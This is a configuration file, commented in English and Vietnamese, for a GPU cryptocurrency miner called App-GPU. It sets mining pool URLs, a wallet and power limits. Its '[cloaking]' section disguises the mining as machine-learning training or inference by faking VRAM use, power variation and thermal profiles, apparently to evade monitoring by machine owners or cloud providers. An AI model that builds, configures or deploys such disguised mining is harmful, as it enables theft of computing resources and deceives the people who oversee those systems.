# App-GPU Configuration File
# Cấu hình hệ thống App-GPU

# Event bus capacity (kích thước hàng đợi sự kiện)
event_bus_capacity = 10000

# ============================================================================
# GPU Executor Configuration (Cấu hình thực thi GPU)
# ============================================================================
[gpu_executor]
# GPU device ID (ID thiết bị GPU - 0 cho card đầu tiên)
device_id = 0

# Power limit in watts (giới hạn công suất - đơn vị watt)
# Set to null to use GPU default
power_limit_watts = 250

# Target GPU utilization (0.0-1.0) (mức sử dụng GPU mục tiêu)
# 0.85 = 85% utilization
target_utilization = 0.85

# Enable NVML control (bật điều khiển NVML - quản lý GPU)
nvml_enabled = true

# Mining pool configuration (cấu hình pool khai thác)
[gpu_executor.pool]
# Pool URL (địa chỉ pool)
# Examples:
#   - Monero: stratum+tcp://pool.supportxmr.com:3333
#   - Ethereum: stratum+tcp://eth-us-west1.nanopool.org:9999
url = "stratum+tcp://pool.example.com:3333"

# Wallet address (địa chỉ ví)
wallet = "YOUR_WALLET_ADDRESS_HERE"

# Worker name (optional) (tên worker - tuỳ chọn)
worker = "worker1"

# Pool password (optional) (mật khẩu pool - tuỳ chọn)
# Most pools use "x" as default
password = "x"

# ============================================================================
# Cloaking System Configuration (Cấu hình hệ thống ngụy trang)
# ============================================================================
[cloaking]
# Enable cloaking (bật ngụy trang)
enabled = true

# Cloaking strategy (chiến lược ngụy trang)
# Options: "adaptive", "training", "inference", "complex"
#   - adaptive: Mixed training/inference (recommended)
#   - training: Simulate ML training workload
#   - inference: Simulate ML inference workload
#   - complex: Multi-layer patterns
strategy = "adaptive"

# VRAM allocation percentage (0.0-1.0) (phần trăm VRAM phân bổ)
# 0.50 = allocate 50% of VRAM for cloaking
vram_allocation = 0.50

# Power variation percentage (0.0-1.0) (phần trăm biến thiên công suất)
# 0.12 = 12% power variation to mimic AI workloads
power_variation = 0.12

# Cycle duration in seconds (thời gian chu kỳ - giây)
# Rotation period for cloaking patterns
cycle_duration = 90

# ============================================================================
# Resource Manager Configuration (Cấu hình quản lý tài nguyên)
# ============================================================================
[resource_manager]
# Enable QoS enforcement (bật thực thi QoS - đảm bảo chất lượng dịch vụ)
qos_enabled = true

# CPU usage limit (0.0-1.0) (giới hạn sử dụng CPU)
# 0.80 = max 80% CPU usage
cpu_limit = 0.80

# GPU usage limit (0.0-1.0) (giới hạn sử dụng GPU)
# 0.95 = max 95% GPU usage
gpu_limit = 0.95

# Network bandwidth limit in Mbps (giới hạn băng thông mạng - Mbps)
# Set to null for no limit
network_limit_mbps = 100

# Enable backpressure (bật phản áp - kiểm soát tải)
# Prevents system overload by throttling when needed
backpressure_enabled = true

# ============================================================================
# Security Configuration (Cấu hình bảo mật)
# ============================================================================
[security]
# Enable mTLS (bật mTLS - xác thực hai chiều)
# Requires cert_path and key_path
mtls_enabled = false

# Certificate path (đường dẫn chứng chỉ)
# cert_path = "/etc/app-gpu/certs/server.crt"

# Private key path (đường dẫn khóa riêng)
# key_path = "/etc/app-gpu/certs/server.key"

# Enable plugin signature verification (bật xác minh chữ ký plugin)
# Recommended: true for production
verify_plugins = true

# Secrets vault path (đường dẫn kho bí mật)
# Encrypted storage for sensitive data
secrets_path = "/var/lib/app-gpu/secrets"

# ============================================================================
# Telemetry Configuration (Cấu hình giám sát)
# ============================================================================
[telemetry]
# Enable Prometheus metrics export (bật xuất metrics Prometheus)
prometheus_enabled = true

# Prometheus listen address (địa chỉ lắng nghe Prometheus)
# Format: "host:port"
prometheus_addr = "0.0.0.0:9090"

# Metrics collection interval in seconds (khoảng thời gian thu thập metrics - giây)
metrics_interval_secs = 30

# Log directory (thư mục log)
log_dir = "/var/log/app-gpu"

# ============================================================================
# Advanced Settings (Cài đặt nâng cao)
# ============================================================================

# Uncomment to override defaults (bỏ comment để override giá trị mặc định)

# [gpu_executor.advanced]
# batch_size = 256                    # Mining batch size
# kernel_threads = 1024               # CUDA threads per block
# max_retries = 3                     # Max retry attempts on failure

# [cloaking.advanced]
# jitter_factor = 0.25                # Random jitter (0.0-1.0)
# pattern_smoothness = 0.8            # Pattern transition smoothness
# thermal_profile_enabled = true      # Enable thermal profile masking

# [resource_manager.advanced]
# numa_enabled = true                 # Enable NUMA-aware allocation
# hugepages_enabled = true            # Use hugepages (requires system support)
# preemption_enabled = false          # Allow task preemption

# [telemetry.advanced]
# tracing_enabled = true              # Enable distributed tracing
# sample_rate = 0.1                   # Tracing sample rate (10%)
# log_rotation_mb = 100               # Log rotation threshold (MB)
# log_retention_days = 7              # Log retention period (days)
